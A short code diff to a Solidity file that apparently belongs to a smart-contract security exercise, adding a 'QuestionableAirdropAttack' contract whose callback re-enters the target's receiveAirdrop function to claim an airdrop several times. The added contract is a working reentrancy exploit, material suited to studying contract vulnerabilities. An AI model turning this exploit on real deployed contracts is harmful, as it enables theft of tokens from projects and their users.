@@ -28,7 +28,6 @@ contract QuestionableAirdrop {
     }
 
     function _isContract(address _account) internal view returns (bool) {
-        // only Contract accounts have code. EOA have 0 code an thus return extcodesize(_account) = 0
         uint256 size;
         assembly {
             size := extcodesize(_account)
@@ -51,5 +50,25 @@ contract QuestionableAirdrop {
 
     function hasReceivedAirdrop(address _user) external view returns (bool) {
         return receivedAirdrops[_user];
+    }
+}
+
+
+contract QuestionableAirdropAttack {
+
+    QuestionableAirdrop ins;
+    uint loop;
+
+    function attack(address _target) external {
+        ins = QuestionableAirdrop(_target);
+        ins.receiveAirdrop(address(this));
+    }
+
+    function canReceiveAirdrop() external returns (bool) {
+        if(loop < 2){
+            loop++;
+            ins.receiveAirdrop(address(this));
+        }
+        return true;
     }
 }
